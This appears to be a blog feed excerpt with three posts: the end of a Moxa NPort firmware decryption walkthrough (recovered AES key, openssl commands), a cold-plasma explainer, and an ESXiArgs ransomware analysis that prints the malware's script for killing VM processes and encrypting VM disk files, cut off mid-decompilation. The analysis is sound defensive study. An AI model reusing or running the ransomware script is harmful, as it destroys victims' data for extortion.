    <img src="/img/nport-firmware/nport-firmware-fw_decrypt-python-output.png"  alt="NPort firmware fw_decrypt while loop reimplemented in python"  class="center"  style="padding: 10px"  />


<p>So that means the password or the AES decrypt key of this program is &ldquo;<em>2887Conn7564</em>&rdquo;. We can now use this to decrypt the encrypted file. We need to convert this into hexadecimal first before we can use it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(hex(byte)[<span style="color:#ae81ff">2</span>:] <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> passwd))
</span></span></code></pre></div><p>This Python line will give us this hex value: <em>32383837436f6e6e373536340000</em>.</p>
<h2 id="the-decryption">The decryption</h2>
<p>Now that we have the key, how do we decrypt this firmware?</p>
<p>We can use <em>OpenSSL</em> to decrypt this. The <code>openssl</code> command-line tool does support AES 128-bit ECB mode so let&rsquo;s use that.</p>
<p>Before we can start decrypting, remember that back when we were reverse engineering the <code>ecb128Decrypt</code> function and doing the <code>hexdump</code>, we found out the exact amount of padding bytes this encrypted firmware has: <em>0x28</em> in hex or 40 in decimal.</p>
<p>So in order to decrypt the data, we need to remove the padding bytes first or it will also decrypt the padding bytes. I&rsquo;ll use <code>dd</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom of<span style="color:#f92672">=</span>firmware-offseted.encrypted bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>8874768+0 records in
</span></span><span style="display:flex;"><span>8874768+0 records out
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8874768</span> bytes transferred in 54.281718 secs <span style="color:#f92672">(</span><span style="color:#ae81ff">163495</span> bytes/sec<span style="color:#f92672">)</span>
</span></span></code></pre></div><blockquote>
<p><strong>Note</strong>: <code>bs</code> means block size, <code>skip</code> means bytes to skip</p></blockquote>
<p>Now we can use <code>openssl</code> to decrypt the new <code>firmware-offseted.encrypted</code> file by running it in decrypt mode and giving it our AES decrypt key:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl aes-128-ecb -d -K <span style="color:#e6db74">&#34;32383837436f6e6e373536340000&#34;</span> -in firmware-offseted.encrypted -out firmware.decrypted
</span></span></code></pre></div><p>This will output a <code>firmware.decrypted</code> file. Now if we run <code>binwalk</code> on this decrypted file:</p>

    <img src="/img/nport-firmware/nport-firmware-firmware-decrypted-openssl.png"  alt="NPort firmware decrypted binwalk"  class="center"  style="padding: 10px"  />


<p>Now we can actually extract the files into <code>_firmware.decrypted.extracted</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e firmware.decrypted
</span></span><span style="display:flex;"><span>cd _firmware.decrypted.extracted
</span></span></code></pre></div><p>Remember to give the <code>squashfs-root</code> directories execution permission:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x -R squashfs-root*
</span></span></code></pre></div><p>Now we have full access to the firmware:</p>

    <img src="/img/nport-firmware/nport-firmware-firmware-decrypted-filesystem.png"  alt="NPort firmware decrypted filesystem"  class="center"  style="padding: 10px"  />


<h2 id="the-conclusion">The conclusion</h2>
<p>That was how to reverse engineer and decrypt an encrypted firmware. We learned a fair about how to analyze a firmware for vulnerabilities and exploit those vulnerabilities.</p>
]]></content>
        </item>
        
        <item>
            <title>Fire! But cold</title>
            <link>https://namberino.github.io/posts/2024/04/fire-but-cold/</link>
            <pubDate>Thu, 18 Apr 2024 20:57:47 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/04/fire-but-cold/</guid>
            <description>&lt;p&gt;I recently came across some experiment on youtube about something called &lt;em&gt;&amp;ldquo;cold fire&amp;rdquo;&lt;/em&gt;. It sound contradictory, right? How can fire, something that is inherently hot, be cold? Well, that is what we are going to explore in this blog post.&lt;/p&gt;
&lt;h2 id=&#34;what-is-fire&#34;&gt;What is fire?&lt;/h2&gt;
&lt;p&gt;To understand fire, we need to understand &lt;strong&gt;plasma&lt;/strong&gt;. It is the 4th state of matter, right after gas. When a gas gets extremely hot, the electrons inside a substance have enough energy to detach from their atom and move freely. This makes the atoms become highly charged due to the lack of electrons and they form a collection of charged particles.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I recently came across some experiment on youtube about something called <em>&ldquo;cold fire&rdquo;</em>. It sound contradictory, right? How can fire, something that is inherently hot, be cold? Well, that is what we are going to explore in this blog post.</p>
<h2 id="what-is-fire">What is fire?</h2>
<p>To understand fire, we need to understand <strong>plasma</strong>. It is the 4th state of matter, right after gas. When a gas gets extremely hot, the electrons inside a substance have enough energy to detach from their atom and move freely. This makes the atoms become highly charged due to the lack of electrons and they form a collection of charged particles.</p>
<p>Fire can be defined <strong>partial plasma</strong> because fire&rsquo;s ionization is low due to the very low percentage of ionized atoms compared to the total number of atoms in the gas. Even though it is considered a low grade plasma compared to something like for example lightning, it is still extremely hot.</p>
<p>Something that is important to understand is that a plasma has 2 sets of temperature:</p>
<ul>
<li>Electron temperature</li>
<li>Ion/Atom temperature</li>
</ul>
<p>Because of the way fire is released (<em>A burst of energy</em>), the atoms get very hot as the reaction happens and the electrons move around. This is actually what happens in most plasmas. If you put more energy into the plasma, the temperature of the atoms rise substantially. This is called hot plasma (or its scientific name &ldquo;Local Thermal Equilibrium Plasma&rdquo; because the temperature of atoms and electrons are equal)</p>

    <img src="/img/cold-fire/match-fire.jpg"  alt="Plasma on match"  class="center"  style="padding: 10px"  />


<p>However, this isn&rsquo;t the only option. If you somehow apply energy in someway that just heats up the electron and keep the atoms cold, you&rsquo;d have a plasma that has an electron temperature of around <em>3 - 15</em> thousand degrees. This is called cold plasma (or its scientific name &ldquo;Non Thermal Equilibrium Plasma&rdquo; because the atoms are at a much lower temperature compared to the electrons, which brings down the average temperature of the plasma). This would actually feel cold because tiny electrons with very little mass compared to atoms don&rsquo;t have the momentum to transfer heat to a large object.</p>
<p>So you can actually touch a cold plasma torch without hurting yourself.</p>

    <img src="/img/cold-fire/cold-plasma-finger.jpg"  alt="Finger touching cold plasma"  class="center"  style="padding: 10px"  />


<h2 id="the-making-of-cold-plasma">The making of cold plasma</h2>
<p>Now that we got the basic theory of plasma and cold plasma down, how can we make cold plasma?</p>
<p>Anyone who&rsquo;s ever played with high voltage (any fellow electrical engineers and enthusiasts out there) knows that high voltage sources allows you to pull a long stream of plasma as soon as the wires get close enough. If you want to see this in action, just watch <a href="https://youtu.be/m7VP36diOKY?si=Bape72WkVFGqrr1b&amp;t=132">this Electroboom video</a></p>
<p>This happens because the electrons in the wires have enough energy to jump out of the wire over a fairly long distance to the common ground to release their energy. As the wires get closer, some electrons jump over the short gap, this will ionize the air molecules around the wires, making more electrons jump over. This also make the air more conductive as the air&rsquo;s electrons are knocked out, which means the electrons has a conductive path to flow through. The more electrons flow, the more ionized the air becomes, the hotter everything around this becomes.</p>
<p>So we can take advantage of this phenomenon to create a stable stream of plasma. We can make this more stable by increasing the voltage but that&rsquo;s pretty costly, so we increase the frequency of the voltage to create a stable plasma arc (the frequency should be in the low radio ranges).</p>
<p>A typical microwave transformer running from city power lines is around <em>60Hz</em> or 60 times per second. The distance that the electrons can jump is proportional to the voltage and 60Hz can create longer wait time between the peaks, where the electrons have the most energy and can jump the farthest. By increasing the frequency, there&rsquo;s more frequent voltage peaks, more time for the electrons to jump with the highest energy.</p>
<p>By doing this, we all so create something called a <em>&ldquo;Far field effect&rdquo;</em>. If we increase the frequency of to low radio ranges, the wire will start to radiate radio waves which can energize the electrons. And we know that more energy means more jump distance.</p>
<p>We can utilize this by directing the electrons by directing them through an insulating tube through a stream of easily ionizable gas like helium or argon. The electrons will ionize the gas, turning it into plasma and the high frequency will help keep this energized.</p>
<p>Because the gas atom isn&rsquo;t exposed to enough energy to heat them up in the short time they are in the tube, the electrons will absorb most of the energy, making the plasma cold plasma.</p>
<h2 id="but-why-cold-plasma">But why cold plasma?</h2>
<p>There&rsquo;s a couple reasons why we need cold plasma:</p>
<ul>
<li>The cold plasma is full of highly reactive charged particles, which can destroy microorganisms very quickly. So this can be used for sterilization without harming the thing it&rsquo;s sterilizing.</li>
<li>The reactive charged particles can be used inside chemistry like seperating a chemical compound.</li>
<li>It&rsquo;s just so cool. I mean come on, it&rsquo;s like magic in real life.</li>
</ul>
<h2 id="making-cold-plasma-yourself">Making cold plasma yourself</h2>
<blockquote>
<p><strong>Disclaimer</strong>: Working with high voltage is <strong>VERY</strong> dangerous. If you don&rsquo;t know what you&rsquo;re doing or you don&rsquo;t have much experience with this, <strong>DO NOT DO THIS</strong>. If you are going to make cold plasma, make sure to take proper precautions.</p></blockquote>
<p>If you have a high voltage, high frequency generator, some insulating tubes and a tank of easily ionizable gas, you can make cold plasma yourself. You can check out this tutorial from the <em>Plasma Channel</em> if you want to make one:</p>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/wOV8kliF4eo?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
    </div>

]]></content>
        </item>
        
        <item>
            <title>ESXiArgs: An Analysis</title>
            <link>https://namberino.github.io/posts/2024/04/esxiargs-an-analysis/</link>
            <pubDate>Mon, 01 Apr 2024 14:42:54 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/04/esxiargs-an-analysis/</guid>
            <description>&lt;p&gt;Last year, a ransomware attack called &lt;strong&gt;ESXiArgs&lt;/strong&gt; managed to encrypt hundreds of VMware machines in multiple different countries. And I decided to try my hands at reverse engineering and analyzing this malware to see how it works. So without further ado, let&amp;rsquo;s reverse this.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: The malware sample was provided by the &lt;a href=&#34;https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686&#34;&gt;bleepingcomputer forum&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;the-script&#34;&gt;The script&lt;/h1&gt;
&lt;p&gt;So right out of the gate, in the script, there&amp;rsquo;s a section called &lt;code&gt;CHANGE CONFIG&lt;/code&gt;:&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Last year, a ransomware attack called <strong>ESXiArgs</strong> managed to encrypt hundreds of VMware machines in multiple different countries. And I decided to try my hands at reverse engineering and analyzing this malware to see how it works. So without further ado, let&rsquo;s reverse this.</p>
<blockquote>
<p>Note: The malware sample was provided by the <a href="https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686">bleepingcomputer forum</a></p></blockquote>
<h1 id="the-script">The script</h1>
<p>So right out of the gate, in the script, there&rsquo;s a section called <code>CHANGE CONFIG</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">## CHANGE CONFIG</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> config_file in <span style="color:#66d9ef">$(</span>esxcli vm process list | grep <span style="color:#e6db74">&#34;Config File&#34;</span> | awk <span style="color:#e6db74">&#39;{print $3}&#39;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;FIND CONFIG: </span>$config_file<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  sed -i -e <span style="color:#e6db74">&#39;s/.vmdk/1.vmdk/g&#39;</span> -e <span style="color:#e6db74">&#39;s/.vswp/1.vswp/g&#39;</span> <span style="color:#e6db74">&#34;</span>$config_file<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>This will find the config files and changing the <code>vmdk</code> config files to <code>vswp</code> files. So nothing super interesting here.</p>
<p>In the next section, the script is stopping the <code>VMX</code> process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">## STOP VMX</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;KILL VMX&#34;</span>
</span></span><span style="display:flex;"><span>kill -9 <span style="color:#66d9ef">$(</span>ps | grep vmx | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>The <code>VMX</code> process is responsible for handling I/O devices. It is also responsible for communicating with user interfaces, snapshot managers, and remote console.</p>
<p>The next section is the &ldquo;meat&rdquo; of the malware, the <em>encrypt</em> section:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">## ENCRYPT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod +x $CLEAN_DIR/encrypt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> volume in <span style="color:#66d9ef">$(</span>IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#e6db74">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#e6db74">&#39;  &#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;START VOLUME: </span>$volume<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  IFS<span style="color:#f92672">=</span><span style="color:#e6db74">$&#39;\n&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> file_e in <span style="color:#66d9ef">$(</span> find <span style="color:#e6db74">&#34;/vmfs/volumes/</span>$volume<span style="color:#e6db74">/&#34;</span> -type f -name <span style="color:#e6db74">&#34;*.vmdk&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmx&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmxf&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmsd&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmsn&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vswp&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmss&#34;</span> -o -name <span style="color:#e6db74">&#34;*.nvram&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmem&#34;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -f <span style="color:#e6db74">&#34;</span>$file_e<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        size_kb<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>du -k $file_e | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $size_kb -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>          size_kb<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>        size_step<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$((</span>$size_kb<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#66d9ef">))</span> -gt <span style="color:#ae81ff">128</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>          size_step<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span><span style="color:#f92672">(</span>$size_kb<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">/</span><span style="color:#ae81ff">100</span><span style="color:#f92672">)-</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;START ENCRYPT: </span>$file_e<span style="color:#e6db74"> SIZE: </span>$size_kb<span style="color:#e6db74"> STEP SIZE: </span>$size_step<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;\&#34;</span>$file_e<span style="color:#e6db74">\&#34; </span>$size_step<span style="color:#e6db74"> 1 </span><span style="color:#66d9ef">$((</span>size_kb*1024<span style="color:#66d9ef">))</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        echo $size_step <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">$((</span>size_kb*1024<span style="color:#66d9ef">))</span> &gt; <span style="color:#e6db74">&#34;</span>$file_e<span style="color:#e6db74">.args&#34;</span>
</span></span><span style="display:flex;"><span>        nohup $CLEAN_DIR/encrypt $CLEAN_DIR/public.pem <span style="color:#e6db74">&#34;</span>$file_e<span style="color:#e6db74">&#34;</span> $size_step <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">$((</span>size_kb*1024<span style="color:#66d9ef">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>  IFS<span style="color:#f92672">=</span><span style="color:#e6db74">$&#34; &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>Let&rsquo;s break this down:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> volume in <span style="color:#66d9ef">$(</span>IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#e6db74">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#e6db74">&#39;  &#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
</span></span></code></pre></div><p>This 1st <code>for loop</code> is going through every volumes in the <code>/vmfs/volumes/</code> directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file_e in <span style="color:#66d9ef">$(</span> find <span style="color:#e6db74">&#34;/vmfs/volumes/</span>$volume<span style="color:#e6db74">/&#34;</span> -type f -name <span style="color:#e6db74">&#34;*.vmdk&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmx&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmxf&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmsd&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmsn&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vswp&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmss&#34;</span> -o -name <span style="color:#e6db74">&#34;*.nvram&#34;</span> -o -name <span style="color:#e6db74">&#34;*.vmem&#34;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
</span></span></code></pre></div><p>This 2nd <code>for loop</code> is going to try to find any files in those volumes with the following extensions:</p>
<ul>
<li><code>.vmdk</code></li>
<li><code>.vmx</code></li>
<li><code>.vmxf</code></li>
<li><code>.vmsd</code></li>
<li><code>.vmsn</code></li>
<li><code>.vswp</code></li>
<li><code>.vmss</code></li>
<li><code>.nvram</code></li>
<li><code>.vmem</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -f <span style="color:#e6db74">&#34;</span>$file_e<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    size_kb<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>du -k $file_e | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $size_kb -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        size_kb<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>    size_step<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$((</span>$size_kb<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#66d9ef">))</span> -gt <span style="color:#ae81ff">128</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        size_step<span style="color:#f92672">=</span><span style="color:#66d9ef">$((</span><span style="color:#f92672">(</span>$size_kb<span style="color:#f92672">/</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">/</span><span style="color:#ae81ff">100</span><span style="color:#f92672">)-</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><p>This part of the script tries to determine the size of the files that it found in the 2nd <code>for loop</code>. The number of steps to encrypt the file (number of MB to skip) is derived from this file size.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nohup $CLEAN_DIR/encrypt $CLEAN_DIR/public.pem <span style="color:#e6db74">&#34;</span>$file_e<span style="color:#e6db74">&#34;</span> $size_step <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">$((</span>size_kb*1024<span style="color:#66d9ef">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span></code></pre></div><p>The file path, file size and number of steps are passed into the <code>encrypt</code> binary. The <code>encrypt</code> binary looks to also take in a public key. Then all of that will get pumped into <code>/dev/null</code> to suppress command line output.</p>
<p>The script also calls <code>nohup</code> to execute this binary in the background. This is done to encrypt the files <em>concurrently</em>.</p>
<p>After researching about this malware, I learned that the malware author will leave an <code>encrypt</code> binary and a <code>decrypt</code> binary. The <code>decrypt</code> binary will require a <em>private key</em> that the victim will have to buy from the malware author (usually through bitcoin)</p>
<p>So the <code>encrypt</code> binary is the core of the malware. Let&rsquo;s try analyzing this binary and see how it works.</p>
<h1 id="the-encrypt-binary">The encrypt binary</h1>
<p>First of all, I ran the <code>file</code> command on the binary and got this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file encrypt
</span></span><span style="display:flex;"><span>encrypt: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.8, with debug_info, not stripped
</span></span></code></pre></div><p>So we have an <code>ELF 64-bit</code> executable since this malware runs on x64 Intel processors. This is also <code>dynamically linked</code>, so this was probably compiled using standard <code>GCC</code> with no crazy flags.</p>
<p>This was also compiled for <code>GNU/Linux 2.6.8</code> which is a pretty old version of Linux.</p>
<p>The weird thing here is that the binary still has <code>debug_info not stripped</code>. Typically, malware authors would strip the binary of the debugging information which would make reverse engineering their malware a whole lot more difficult. This malware, however, still has all the debugging information as it has not been stripped. This means that all the functions still have the symbols and there&rsquo;s still information from <code>GCC</code> about how this program was compiled.</p>
<p>Next, I ran <code>strings</code> on the binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings encrypt
</span></span></code></pre></div><p>Since the binary was not obfuscated, I started looking for anything related to encrypting and I found this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>BIO_new_mem_buf
</span></span><span style="display:flex;"><span>ERR_get_error
</span></span><span style="display:flex;"><span>ERR_error_string
</span></span><span style="display:flex;"><span>PEM_read_bio_RSA_PUBKEY
</span></span><span style="display:flex;"><span>PEM_read_bio_RSAPrivateKey
</span></span><span style="display:flex;"><span>RAND_pseudo_bytes
</span></span><span style="display:flex;"><span>RSA_public_encrypt
</span></span><span style="display:flex;"><span>RSA_private_decrypt
</span></span><span style="display:flex;"><span>RSA_size
</span></span></code></pre></div><p><code>PEM_read_bio_RSA_PUBKEY</code> will read some file as a public key. <code>PEM_read_bio_RSAPrivateKey</code> will read some file as a private key. <code>RAND_pseudo_bytes</code> will generate a pseudo-random number, this will probably be used later on for encryption.</p>
<p>We also have <code>RSA_public_encrypt</code> and <code>RSA_private_decrypt</code>. So it looks like this is using <strong>RSA</strong> which is an <em>asymmetric encryption</em> algorithm.</p>
<p>If you don&rsquo;t know what <em>asymmetric encryption</em> is, imagine a mailbox. A mailbox is publically accessible and anyone can drop a letter in it. But only the owner who has the key to the mailbox can unlock it and read the mail in it.</p>
<p><em>Asymmetric encryption</em> is similar to that. It uses 2 keys, <em>public</em> and <em>private</em>. The public key will be handed out to other people. When someone wants to send data to you, they will use the public key that they got from you to encrypt the data and you will use your private key to decrypt the data. This is cryptographically safe because even if a hacker got a hold of the data and the public key, they wouldn&rsquo;t be able to do anything as the public key is useless when it comes to decrypting the data. The data, once encrypted with the public key, can only be decrypted with the private key.</p>
<p>So this binary will <code>RSA_public_encrypt</code> with a public key to encrypt the files and <code>RSA_private_decrypt</code> with a private key to decrypt the files.</p>
<p>Let&rsquo;s load this up into a disassembler to reverse engineer this.</p>
<h1 id="the-disassembling">The disassembling</h1>
<p>I&rsquo;ll be using <a href="https://ghidra-sre.org/">[<strong>Ghidra</strong>]</a> as my disassembler of choice.</p>

    <img src="/img/esxiargs-analysis/ghidra-esxiargs.png"  alt="ESXiArgs in Ghidra"  class="center"  style="padding: 10px"  />


<p>Here&rsquo;s the <code>main</code> function of the <code>encrypt</code> binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">long</span> param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined4 local_4c;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_38;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_30;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_28;
</span></span><span style="display:flex;"><span>  undefined8 local_20;
</span></span><span style="display:flex;"><span>  undefined8 local_18;
</span></span><span style="display:flex;"><span>  uint local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
